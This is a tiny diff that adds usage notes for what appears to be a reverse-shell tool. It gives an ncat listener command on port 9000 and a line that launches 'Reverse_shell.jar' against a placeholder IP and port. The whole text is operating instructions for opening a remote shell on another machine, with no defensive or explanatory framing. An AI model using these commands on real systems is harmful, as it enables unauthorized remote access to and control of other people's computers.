@@ -1,0 +1,5 @@
+Netcat listener command
+ncat -nvlp 9000
+
+start shell
+Reverse_shell.jar IP PORT
